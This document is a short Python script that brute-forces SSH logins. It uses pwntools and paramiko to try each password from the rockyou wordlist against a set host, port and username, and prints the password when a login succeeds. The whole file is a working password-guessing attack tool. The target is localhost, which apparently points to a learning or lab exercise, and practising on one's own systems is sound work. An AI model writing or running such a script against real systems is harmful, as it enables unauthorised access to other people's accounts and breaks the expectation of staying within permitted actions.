#!/bin/python3

from pwn import *
import paramiko

HOST = "127.0.0.1" #Target Host
PORT = 22 #Target SSH Port
USER = "markofka" #Target User

wordlist_path = "/usr/share/wordlists/rockyou.txt"

attempts = 0

with open(wordlist_path, "r") as pwlist:
    for pw in pwlist:
        pw = pw.strip("\n")
        try:
            print(f"[{attempts}] Trying: {pw}")
            ssh_response = ssh(host=HOST, user=USER, port=PORT, password=pw, timeout=1)
            if ssh_response.connected():
                print(f"FOUND PASSWORD: {pw}")
                ssh_response.close()
                break
            ssh_response.close()
        except paramiko.ssh_exception.AuthenticationException:
            print("Invalid Password!")
            attempts += 1